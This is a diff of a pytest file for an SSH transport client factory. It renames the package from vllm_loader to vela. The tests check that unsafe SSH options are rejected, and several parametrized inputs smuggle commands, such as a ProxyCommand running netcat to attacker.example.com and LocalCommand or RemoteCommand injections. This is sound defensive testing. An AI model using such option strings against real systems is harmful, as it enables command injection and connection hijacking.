@@ -4,16 +4,16 @@ from pathlib import Path
 
 import pytest
 
-from vllm_loader.config.targets import TargetConfig, TransportKind
-from vllm_loader.transport.client import event_matches_subscription
-from vllm_loader.transport.inprocess import InProcessTargetClient
-from vllm_loader.transport.socket import UnixSocketTargetClient
-from vllm_loader.transport.subprocess import SubprocessTargetClient
+from vela.config.targets import TargetConfig, TransportKind
+from vela.transport.client import event_matches_subscription
+from vela.transport.inprocess import InProcessTargetClient
+from vela.transport.socket import UnixSocketTargetClient
+from vela.transport.subprocess import SubprocessTargetClient
 
 
 def _target_client_for_config():
     try:
-        from vllm_loader.transport.factory import target_client_for_config
+        from vela.transport.factory import target_client_for_config
     except ModuleNotFoundError as exc:
         pytest.fail(f"target client factory missing: {exc}")
     return target_client_for_config
@@ -78,14 +78,14 @@ def test_target_client_factory_builds_explicit_local_socket_client(
 def test_target_client_factory_builds_ssh_subprocess_client(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", "-i /tmp/gpu-key -o ProxyJump=bastion")
+    monkeypatch.setenv("VELA_SSH_OPTS", "-i /tmp/gpu-key -o ProxyJump=bastion")
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        workdir=Path("/tank/repos/lab-tui"),
-        venv=Path("/tank/venvs/lab-tui"),
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        workdir=Path("/tank/repos/vela"),
+        venv=Path("/tank/venvs/vela"),
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     client = _target_client_for_config()(target)
@@ -109,21 +109,21 @@ def test_target_client_factory_builds_ssh_subprocess_client(
         "-o",
         "ControlPersist=60s",
         "-o",
-        "ControlPath=~/.ssh/vllm-loader-%C",
+        "ControlPath=~/.ssh/vela-%C",
         "bgconley@10.25.0.51",
-        "cd /tank/repos/lab-tui && PATH=/tank/venvs/lab-tui/bin:$PATH vllm-loader agent connect",
+        "cd /tank/repos/vela && PATH=/tank/venvs/vela/bin:$PATH vela agent connect",
     ]
 
 
 def test_target_client_factory_rejects_positional_ssh_opts(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", "-i /tmp/gpu-key evil.example.com")
+    monkeypatch.setenv("VELA_SSH_OPTS", "-i /tmp/gpu-key evil.example.com")
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="positional SSH argument"):
@@ -143,12 +143,12 @@ def test_target_client_factory_rejects_malformed_ssh_option_assignments(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="malformed SSH option assignment"):
@@ -161,19 +161,19 @@ def test_target_client_factory_rejects_malformed_ssh_option_assignments(
         "-o ProxyCommand='nc attacker.example.com 22'",
         "-oProxyCommand='nc attacker.example.com 22'",
         "-o RemoteCommand=whoami",
-        "-o PermitLocalCommand=yes -o LocalCommand='touch /tmp/vllm-loader-owned'",
+        "-o PermitLocalCommand=yes -o LocalCommand='touch /tmp/vela-owned'",
     ],
 )
 def test_target_client_factory_rejects_command_bearing_ssh_options(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="command-bearing SSH option"):
@@ -195,12 +195,12 @@ def test_target_client_factory_rejects_opaque_ssh_routing_options(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="routing SSH option"):
@@ -221,12 +221,12 @@ def test_target_client_factory_rejects_agent_forwarding_ssh_options(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="agent-forwarding SSH option"):
@@ -248,12 +248,12 @@ def test_target_client_factory_rejects_forwarding_ssh_options(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="forwarding SSH option"):
@@ -275,12 +275,12 @@ def test_target_client_factory_rejects_target_identity_ssh_overrides(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="target identity SSH option"):
@@ -298,12 +298,12 @@ def test_target_client_factory_rejects_included_ssh_config_options(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="routing SSH option"):
@@ -325,12 +325,12 @@ def test_target_client_factory_rejects_provider_loading_ssh_options(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="provider-loading SSH option"):
@@ -358,12 +358,12 @@ def test_target_client_factory_rejects_host_verification_weakening_ssh_options(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="host verification SSH option"):
@@ -374,14 +374,14 @@ def test_target_client_factory_accepts_concatenated_safe_ssh_opts(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     monkeypatch.setenv(
-        "VLLM_LOADER_SSH_OPTS",
+        "VELA_SSH_OPTS",
         "-i/tmp/gpu-key -Jbastion -p2222 -oStrictHostKeyChecking=yes",
     )
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     client = _target_client_for_config()(target)
@@ -410,12 +410,12 @@ def test_target_client_factory_accepts_agent_forwarding_disabled_ssh_options(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     client = _target_client_for_config()(target)
@@ -439,12 +439,12 @@ def test_target_client_factory_rejects_required_ssh_option_overrides(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="required SSH option"):
@@ -466,12 +466,12 @@ def test_target_client_factory_rejects_tty_allocating_ssh_options(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="tty SSH option"):
@@ -482,14 +482,14 @@ def test_target_client_factory_accepts_tty_disabling_ssh_options(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     monkeypatch.setenv(
-        "VLLM_LOADER_SSH_OPTS",
+        "VELA_SSH_OPTS",
         "-T -o RequestTTY=no",
     )
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     client = _target_client_for_config()(target)
@@ -512,12 +512,12 @@ def test_target_client_factory_rejects_stdio_suppressing_ssh_options(
     monkeypatch: pytest.MonkeyPatch,
     ssh_opts: str,
 ) -> None:
-    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    monkeypatch.setenv("VELA_SSH_OPTS", ssh_opts)
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="stdio SSH option"):
@@ -528,14 +528,14 @@ def test_target_client_factory_accepts_stdio_preserving_ssh_options(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     monkeypatch.setenv(
-        "VLLM_LOADER_SSH_OPTS",
+        "VELA_SSH_OPTS",
         "-o ForkAfterAuthentication=no -o StdinNull=no",
     )
     target = TargetConfig(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     client = _target_client_for_config()(target)
